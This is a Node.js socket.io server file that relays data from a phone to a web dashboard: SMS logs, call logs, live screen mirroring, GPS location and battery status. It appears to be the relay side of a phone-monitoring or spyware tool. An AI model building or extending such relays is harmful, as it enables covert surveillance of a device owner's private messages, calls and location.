const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
  socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));

    // NEW: Relay Call Log requests and data
    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
    socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));
// Add these lines inside io.on('connection', (socket) => { ... });

// Relay screen view request to device
socket.on('request-screen-view', () => socket.broadcast.emit('request-screen-view'));
socket.on('stop-mirroring', () => socket.broadcast.emit('stop-mirroring'));
socket.on('screen-status', (status) => socket.broadcast.emit('screen-status', status));
socket.on('screen-data', (data) => socket.broadcast.emit('ui-screen-stream', data));

    // NEW: Relay GPS updates
    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));

    socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));
});

server.listen(process.env.PORT || 3000);




